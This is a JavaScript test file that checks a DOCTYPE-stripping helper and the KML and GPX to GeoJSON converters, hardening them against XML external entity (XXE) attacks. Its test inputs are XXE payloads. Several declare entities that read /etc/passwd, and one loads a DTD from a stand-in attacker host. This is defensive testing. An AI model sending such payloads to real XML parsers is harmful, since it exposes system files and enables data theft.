const assert = require('node:assert/strict');
const { describe, it } = require('node:test');
const { stripDoctype, convertKmlContent, convertGpxContent } = require('./index.js');

describe('stripDoctype', () => {
    it('removes a simple DOCTYPE declaration', () => {
        const xml = '<?xml version="1.0"?><!DOCTYPE kml><kml></kml>';
        assert.equal(stripDoctype(xml), '<?xml version="1.0"?><kml></kml>');
    });

    it('removes a DOCTYPE with an internal subset containing an entity definition (XXE vector)', () => {
        const xml = '<?xml version="1.0"?>' +
            '<!DOCTYPE kml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
            '<kml><name>&xxe;</name></kml>';
        const stripped = stripDoctype(xml);
        assert.ok(!stripped.includes('<!DOCTYPE'));
        assert.ok(!stripped.includes('ENTITY'));
        assert.ok(!stripped.includes('SYSTEM'));
        // The entity reference itself is left in the body (it's outside the DOCTYPE), but with
        // no DTD present to declare it, the XML parser cannot expand it into file content.
        assert.equal(stripped, '<?xml version="1.0"?><kml><name>&xxe;</name></kml>');
    });

    it('removes a multi-line DOCTYPE with an internal subset', () => {
        const xml = [
            '<?xml version="1.0"?>',
            '<!DOCTYPE kml [',
            '  <!ENTITY xxe SYSTEM "http://attacker.example/evil.dtd">',
            ']>',
            '<kml><Document/></kml>',
        ].join('\n');
        const stripped = stripDoctype(xml);
        assert.ok(!stripped.includes('<!DOCTYPE'));
        assert.ok(!stripped.includes('attacker.example'));
        assert.ok(stripped.includes('<kml><Document/></kml>'));
    });

    it('is a no-op on content with no DOCTYPE', () => {
        const xml = '<?xml version="1.0"?><kml><Document/></kml>';
        assert.equal(stripDoctype(xml), xml);
    });

    it('is case-insensitive on the DOCTYPE keyword', () => {
        const xml = '<?xml version="1.0"?><!doctype kml><kml/>';
        assert.equal(stripDoctype(xml), '<?xml version="1.0"?><kml/>');
    });
});

describe('convertKmlContent XXE hardening', () => {
    it('converts a KML document carrying a DOCTYPE with an entity bomb without expanding it', () => {
        const kml = '<?xml version="1.0"?>' +
            '<!DOCTYPE kml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
            '<kml xmlns="http://www.opengis.net/kml/2.2">' +
            '<Document><Placemark><name>Test</name>' +
            '<Point><coordinates>-122.4194,37.7749,0</coordinates></Point>' +
            '</Placemark></Document></kml>';

        const geojson = convertKmlContent(kml);
        assert.equal(geojson.type, 'FeatureCollection');
        assert.equal(geojson.features.length, 1);
        // The entity reference must not have been resolved into file content anywhere in the output.
        const serialized = JSON.stringify(geojson);
        assert.ok(!serialized.includes('root:'));
    });
});

describe('convertGpxContent XXE hardening', () => {
    it('converts a GPX document carrying a DOCTYPE with an entity bomb without expanding it', () => {
        const gpx = '<?xml version="1.0"?>' +
            '<!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
            '<gpx version="1.1" xmlns="http://www.topografix.com/GPX/1/1">' +
            '<wpt lat="37.7749" lon="-122.4194"><name>Test</name></wpt>' +
            '</gpx>';

        const geojson = convertGpxContent(gpx);
        assert.equal(geojson.type, 'FeatureCollection');
        assert.equal(geojson.features.length, 1);
    });
});
